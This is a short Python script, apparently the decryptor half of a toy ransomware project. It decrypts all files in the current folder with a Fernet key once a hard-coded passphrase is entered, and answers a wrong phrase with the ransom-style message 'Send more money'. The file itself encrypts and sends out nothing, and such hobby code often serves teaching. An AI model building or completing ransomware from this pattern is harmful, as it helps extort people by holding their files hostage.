import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file == "voldemort.py" or file == "thekey.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)
print (files)

with open("thekey.key", "rb") as key:
    secretkey = key.read()

secretphrase = "debanjan"

user_phrase = input("Enter the secret phrase to decrypt your file : ")

if user_phrase == secretphrase:
    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_decrypted = Fernet(secretkey).decrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_decrypted)
    print("Congrats!!! Your files are Decrypted.... Enjoyyyyyyyyyyy")

else:
    print("Sorry. Send more money")
